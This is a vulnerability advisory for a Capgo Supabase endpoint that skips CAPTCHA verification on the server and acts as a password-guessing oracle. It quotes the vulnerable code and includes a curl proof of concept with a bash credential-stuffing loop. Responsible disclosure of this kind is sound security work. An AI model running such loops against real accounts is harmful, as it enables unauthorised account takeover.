# VULN-001 — CAPTCHA Bypass on `/private/validate_password_compliance`

**Severity:** High  
**Component:** `supabase/functions/_backend/private/validate_password_compliance.ts`  
**Affected deployments:** All (Cloudflare Workers + Supabase Edge Functions)

---

## Summary

The `/private/validate_password_compliance` endpoint is publicly accessible without authentication and performs a real Supabase `signInWithPassword` call to verify user credentials. Although the endpoint accepts an optional `captcha_token` field and the wider codebase configures Cloudflare Turnstile via `CAPTCHA_SECRET_KEY`, the endpoint **never validates the CAPTCHA server-side**. An automated attacker can omit the `captcha_token` field entirely and make unlimited credential-guessing requests without any CAPTCHA challenge.

---

## Details

Every other sensitive unauthenticated endpoint in the codebase (e.g. `invite_new_user_to_org.ts`) calls `verifyCaptchaToken(c, body.captcha_token, captchaSecret)` before processing the request. `validate_password_compliance.ts` only forwarded the token to Supabase; it never enforced the secret independently.

**Vulnerable code** (`supabase/functions/_backend/private/validate_password_compliance.ts`, lines 109–116):

```typescript
// Authenticate first to avoid leaking org existence to unauthenticated callers.
const loginClient = emptySupabase(c)
const { data: signInData, error: signInError } = await loginClient.auth.signInWithPassword({
  email: body.email,
  password: body.password,
  options: body.captcha_token
    ? { captchaToken: body.captcha_token }   // ← forwarded but never validated server-side
    : undefined,
})
```

There is no `if (captchaSecret) { if (!body.captcha_token) ... await verifyCaptchaToken(...) }` guard anywhere in this handler.

The endpoint returns distinct HTTP responses depending on credential validity:

| Scenario | Response |
|---|---|
| Wrong password | `401 invalid_credentials` |
| Correct password, policy compliant | `200 { status: 'ok' }` |
| Correct password, policy non-compliant | `400 password_does_not_meet_policy` |
| Correct password, org lacks policy | `400 no_policy` |

This makes the endpoint a **credential oracle**: a `401` unambiguously means wrong credentials.

---

## PoC

**Prerequisites:**
- A Capgo instance with `CAPTCHA_SECRET_KEY` set (i.e. Turnstile protection is enabled).
- A valid `org_id` (obtainable from the registration/onboarding flow).

**Steps:**

```bash
# No captcha_token field — the server accepts the request regardless of CAPTCHA configuration
curl -s -X POST https://<project>.supabase.co/functions/v1/private/validate_password_compliance \
  -H "Content-Type: application/json" \
  -d '{
    "email": "target@example.com",
    "password": "GuessedPassword1!",
    "org_id": "<valid-org-uuid>"
  }'
# Response on WRONG password:  {"error":"invalid_credentials","message":"Invalid email or password"}
# Response on CORRECT password: {"status":"ok","message":"Password verified..."}  (or 400 policy error)

# Automated credential-stuffing loop (runs freely with no CAPTCHA friction):
for pw in "Password1!" "Summer2025!" "Capgo2025!"; do
  curl -s -X POST https://<project>.supabase.co/functions/v1/private/validate_password_compliance \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"target@example.com\",\"password\":\"${pw}\",\"org_id\":\"<valid-org-uuid>\"}"
done
```

---

## Impact

**Type:** Authentication bypass / Credential brute-force oracle  
**Authentication required:** None  
**CVSS estimate:** High (7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

Any unauthenticated attacker who knows (or can enumerate) a valid `org_id` and a target user's email address can perform unlimited automated password-guessing against any Capgo account. On a successful guess the attacker learns the plaintext password, which may be reused on other services. The absence of CAPTCHA enforcement makes this trivially automatable at scale.
